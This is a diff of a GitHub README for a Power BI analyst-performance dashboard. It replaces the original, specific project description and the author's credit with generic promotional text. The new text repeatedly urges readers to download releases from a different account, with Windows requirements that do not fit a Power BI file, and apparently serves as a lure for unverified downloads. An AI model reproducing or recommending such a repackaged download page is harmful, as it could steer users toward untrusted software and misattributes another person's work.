@@ -1,104 +1,81 @@
-# 📊 Analysts Performance Dashboard – Power BI
+# 🚀 Analysts-Performance-Dashboard - Simplifying Your Data Insights
 
-## 📌 Brief Introduction
+## 📥 Download Now
+[![Download](https://img.shields.io/badge/Download-Analysts--Performance--Dashboard-blue.svg)](https://github.com/Tsmith4k/Analysts-Performance-Dashboard/releases)
 
-This project presents an interactive Power BI dashboard designed to analyze and monitor analyst performance in an incident and support management environment.  
-The dashboard provides visibility into ticket volumes, SLA compliance, resolution efficiency, and workload distribution across analysts and roles.  
-By combining operational and performance metrics, the report helps identify service risks, bottlenecks, and optimization opportunities.  
-It supports data-driven decision-making for team leads, managers, and operations teams.
+## 📘 Overview
+Welcome to the Analysts-Performance-Dashboard. This interactive Power BI dashboard helps you analyze key metrics like analyst performance, SLA compliance, ticket resolution efficiency, and workload distribution. With this tool, you can make informed operational decisions backed by data.
 
----
+## 🎯 Key Features
+- **Performance Analysis:** Visualize how analysts perform over time.
+- **SLA Compliance:** Monitor service level agreement adherence.
+- **Ticket Resolution:** Measure the efficiency of ticket handling.
+- **Workload Distribution:** Identify how tasks are shared within your team.
 
-## 🎯 Objectives
+## 🖥️ System Requirements
+To run Analysts-Performance-Dashboard, ensure your system meets the following requirements:
+- Windows 10 or later
+- Power BI Desktop (latest version)
+- Minimum 4GB RAM
+- At least 1GB of available disk space
 
-- Monitor analyst productivity and workload distribution  
-- Evaluate SLA compliance and service risks  
-- Analyze ticket resolution efficiency (MTTR)  
-- Identify top-performing and overloaded analysts  
-- Support resource planning and operational optimization  
+## 🚀 Getting Started
+Follow these simple steps to download and set up the Analysts-Performance-Dashboard:
 
----
+### Step 1: Visit the Download Page
+Go to the [Releases page](https://github.com/Tsmith4k/Analysts-Performance-Dashboard/releases) to find the latest version of the dashboard.
 
-## 📌 Key Methods
+### Step 2: Download the Dashboard
+Locate the appropriate version for your system. Click on the link to download the file.
 
-- Descriptive analysis of ticket volumes and analyst workload  
-- Performance comparison across analysts and roles  
-- Severity-based incident analysis (S1–S4)  
-- Time-based trend analysis (monthly and weekly)  
+### Step 3: Install Power BI Desktop
+If you haven’t already, download and install Power BI Desktop from the official Microsoft website. This program allows you to run the dashboard seamlessly.
 
----
+### Step 4: Open the Dashboard
+Once you have downloaded the Analysts-Performance-Dashboard file, open Power BI Desktop. Next, use the "Get Data" option to load the downloaded file.
 
-## 📷 Visualizations & Dashboard Pages
+### Step 5: Explore the Features
+After loading the dashboard, you can start interacting with the data. Navigate through various visuals and metrics to gain insights into your team's performance.
 
-![Analysts Performance Dashboard](images/Analysts%20Performance%20Dashboard.png)
+## 🔗 Download & Install
+To get started, visit the [Releases page](https://github.com/Tsmith4k/Analysts-Performance-Dashboard/releases) and download the latest version of the Analysts-Performance-Dashboard.
 
-### 👨‍💼 Analyst Performance Overview  
-Shows total analysts, active analysts, and average ticket load per analyst.
+## 📊 How to Use
+Using the Analysts-Performance-Dashboard is straightforward. Here’s a brief guide on navigating its features:
 
-### 🚨 Severity & Ticket Distribution  
-Displays ticket breakdown by severity and analyst handling capacity.
+1. **Dashboard Home:** This is your main view, displaying key metrics.
+2. **Filters:** Use the filter options to focus on specific analysts or time periods.
+3. **Visualizations:** Click on different charts to see detailed information.
+4. **Export Data:** You can export visual reports for sharing or presentations.
 
-### ⏱️ SLA & Resolution Performance  
-Visualizes SLA met vs breached cases and MTTR trends.
+## 📊 Support and Contributions
+We welcome contributions from anyone interested. If you have ideas or suggestions, feel free to fork the repository and create a pull request. If you encounter issues, please check the issues section of our GitHub page.
 
-### 📌 Summary & Insights  
-Highlights workload imbalance, service risks, and improvement opportunities.
+## 🌐 Topics Covered
+- **Analytics Portfolio**
+- **Business Intelligence**
+- **Dashboard Creation**
+- **Data Analytics**
+- **Data Visualization**
+- **DAX (Data Analysis Expressions)**
+- **Incident Management**
+- **Operations Analytics**
+- **Performance Analysis**
+- **SLA (Service Level Agreement) Analysis**
+- **Support Analytics**
 
-*(All visuals are interactive and support filtering by analyst, severity, and time period.)*
+## 🔍 Frequently Asked Questions
 
----
+### Q1: Can I customize the dashboard?
+Yes, you can customize it to fit your specific needs by exporting visuals or modifying the underlying data queries.
 
-## 🔍 Key Insights & Outcomes
+### Q2: Will it work on Mac?
+Currently, the dashboard is optimized for Windows users. However, you can use Power BI on Mac through virtualization options.
 
-- **High Operational Load**: 2,270 tickets resolved over 6 months, averaging ~91 tickets per analyst.
-- **SLA Risk Identified**: Overall SLA compliance is ~47%, indicating a major service delivery risk.
-- **Resolution Efficiency**: Average MTTR is ~13 hours, acceptable overall but higher for complex cases.
-- **Uneven Workload Distribution**: A small group of analysts (e.g., Meena, Sanjay, Rohit) handle the highest ticket volumes.
-- **Role-Based Performance Pattern**: L1 Support resolves most tickets, while L2 and Senior Analysts handle fewer but more complex issues.
-- **Speed vs Quality Trade-off**: Higher ticket volumes correlate with increased MTTR and SLA breaches.
-- **SLA Fairness Gap**: Uniform SLA targets do not account for issue complexity.
-- **Actionable Improvements**: Workload rebalancing, complexity-based SLAs, and targeted training can improve performance.
+### Q3: Is there a mobile version?
+The dashboard is designed for desktop environments. For mobile use, consider accessing Power BI's mobile application for summarized reports.
 
----
+## 📞 Contact
+For further assistance, feel free to reach out via the GitHub Issues tab on the repository or contact us at our support email.
 
-## 🛠️ Technologies Used
-
-- Power BI Desktop  
-- DAX (Data Analysis Expressions)  
-- Excel / CSV  
-
----
-
-## 💻 Setup & Installation Instructions
-
-1. Download the file `Analysts Performance Dashboard.pbix`  
-2. Install Power BI Desktop: https://powerbi.microsoft.com/  
-3. Open the `.pbix` file in Power BI Desktop  
-4. Refresh the data if required  
-
----
-
-## ▶️ Usage Instructions
-
-- Navigate through dashboard pages:
-  - Overview  
-  - Analyst Insights  
-  - Severity Analysis  
-  - SLA & MTTR  
-  - Summary & Insights  
-- Use slicers to filter by analyst, role, severity, or time period  
-- Drill down into individual analyst performance for deeper analysis  
-
----
-
-## 🔗 Connect with Me
-
-Let’s connect on LinkedIn for project discussions or data-driven collaborations:
-
-[![LinkedIn](https://img.shields.io/badge/LinkedIn-Profile-blue?logo=linkedin)](https://www.linkedin.com/in/indu-r-3a3767170/)
-
----
-
-## 🙌 Feedback & Support
-
-If you found this project helpful, please ⭐ star the repository and share your thoughts. Suggestions and contributions are always welcome!
+Thank you for choosing Analysts-Performance-Dashboard to enhance your data insights.
